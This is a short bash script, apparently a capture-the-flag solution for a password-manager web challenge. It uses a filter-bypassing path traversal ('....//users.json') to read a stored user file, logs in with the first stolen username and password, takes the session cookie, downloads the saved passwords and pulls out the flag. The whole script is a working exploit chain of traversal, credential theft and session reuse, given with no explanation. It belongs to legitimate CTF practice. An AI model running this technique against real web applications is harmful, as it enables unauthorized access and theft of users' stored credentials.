#!/bin/bash

url="https://password-manager-web.chal.irisc.tf"

# path traversal users.json
usr_pass=$(curl -s $url/....//users.json| jq -c 'to_entries | map({usr: .key, pwd: .value})[0]')
echo "/users.json: $usr_pass"

# use creds 
cookie=$(curl -X POST $url/login -H "Content-Type: application/json" -d $usr_pass -s -i | grep -i "set-cookie" | cut -d ' ' -f 2)
passwords=$(curl -s $url/getpasswords -H "Cookie: $cookie")
echo "/getpasswords: $passwords"

flag=$(echo $passwords| jq -r '.[1].Password')
echo "flag: $flag"

